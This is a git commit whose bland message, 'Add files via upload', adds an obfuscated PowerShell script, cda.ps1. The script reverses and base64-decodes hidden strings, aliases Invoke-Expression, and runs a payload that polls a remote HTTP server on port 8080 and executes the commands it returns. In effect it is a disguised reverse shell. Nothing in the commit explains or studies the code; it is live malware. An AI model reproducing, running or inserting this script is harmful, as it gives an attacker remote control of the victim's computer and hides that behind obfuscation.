47d5a69b9167bb511aeb8477ec4bbd21ccbffe3d
Brof1stID <52061565+ducducuc111@users.noreply.github.com>
2026-05-26 15:12:20 +0700

    Add files via upload

---
+++ cda.ps1
@@ -0,0 +1,12 @@
+$k1NOV0zmqiZYC8st = "oQf4ACclVGbzBSfpcCInAibp9matASKyRyKlRCKzVGd5JEdldkL4YEVVpjOddmbpR2bj5WRuQHelRlLtVGdzl3UbhCI5R2bC1CI9lGJ9IiMmVWYtEmMlZWLYJyeABycyVGZhVGStACVT9EUgQ2boRXZN1CIyYjZiRzYjVzLzRCckASayVVLgQ3clVXclJlYldVLlt2b25WS9QHJ7IHJgQ3YlpmYPRXdw5WStAyZulmc0NVL0V3T9IHJ7UGIlxmYhlmchZlcvJncF1CIw9GdTBibvlGdjFkcvJncF1CIjRCI4VWa9IHJ7BSKnUmbv50JgUmbtAyYkgCIml2O05WZ052bD5SK9lGJ9IiMmVWYtEmMlZWLYJyeABycyVGZhVGStACO1YGZwUGZ38yckAHJgkmcV1CIn5WazJXYQNWazFmQlNXVtACdzVWdxVmUiV2VtU2avZnbJhSPjRyepUWdyRHJoASZslGa3tTfpRSPiIjZlFWLhJTZm1CWisHQgMnclRWYlhULgcDN5QmZldDOvMHJwRCIpJXVtAyZul2cyFGUjl2chJUZzVVLgQ3clVXclJlYldVLlt2b25WS9YHJ7cyLvoDc0RHan0DckszJyYjZiRzYjVTL4UjZkBTZkdTL3QTOkZWZ3gzJ9kGJ7cCM4ADO6ITMy4SMugjNx4iM5EzJ9MHJ" ;
+$sokA2BSD7Rp0FIgGQHW = $k1NOV0zmqiZYC8st.ToCharArray() ; [array]::Reverse($sokA2BSD7Rp0FIgGQHW) ; $9uc3y0dCN = -join $sokA2BSD7Rp0FIgGQHW ;
+$SejG = switch ($9uc3y0dCN.Length % 4) { 0 { $9uc3y0dCN }; 1 { $9uc3y0dCN.Substring(0, $9uc3y0dCN.Length - 1) }; 2 { $9uc3y0dCN + ("=" * 2) }; 3 { $9uc3y0dCN + "=" }} ;
+$17X4GS0kiCtbrcIRYw6 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($SejG)) ;
+$82X27Nc37bTNDeX2 = '42bpN3UlJFcYVULFt2bW5WS'.ToCharArray() ; [array]::Reverse($82X27Nc37bTNDeX2) ; $9KTYEqXOMNmcCUG = -join $82X27Nc37bTNDeX2 ;
+$9KTYEqXOMNmcCUG = switch ($9KTYEqXOMNmcCUG.Length % 4) { 0 { $9KTYEqXOMNmcCUG }; 1 { $9KTYEqXOMNmcCUG.Substring(0, $9KTYEqXOMNmcCUG.Length - 1) }; 2 { $9KTYEqXOMNmcCUG + '=' * 2 }; 3 { $9KTYEqXOMNmcCUG + '=' } } ;
+$T39OoSWuxuqm63jxem = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($9KTYEqXOMNmcCUG)) ;
+$tV0no = 'QYtNmU'.ToCharArray() ; [array]::Reverse($tV0no) ; $g3hMsBrUitt4G = -join $tV0no ;
+$g3hMsBrUitt4G = switch ($g3hMsBrUitt4G.Length % 4) { 0 { $g3hMsBrUitt4G }; 1 { $g3hMsBrUitt4G.Substring(0, $g3hMsBrUitt4G.Length - 1) }; 2 { $g3hMsBrUitt4G + '=' * 2 }; 3 { $g3hMsBrUitt4G + '=' } } ;
+$VGOcPsnqqpSkxBuWPvVtVQMO = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($g3hMsBrUitt4G)) ;
+$NulL = nEw-alIaS -name $VGOcPsnqqpSkxBuWPvVtVQMO -ValUE $T39OoSWuxuqm63jxem -FOrCe ; & $VGOcPsnqqpSkxBuWPvVtVQMO $17X4GS0kiCtbrcIRYw6 ;
+
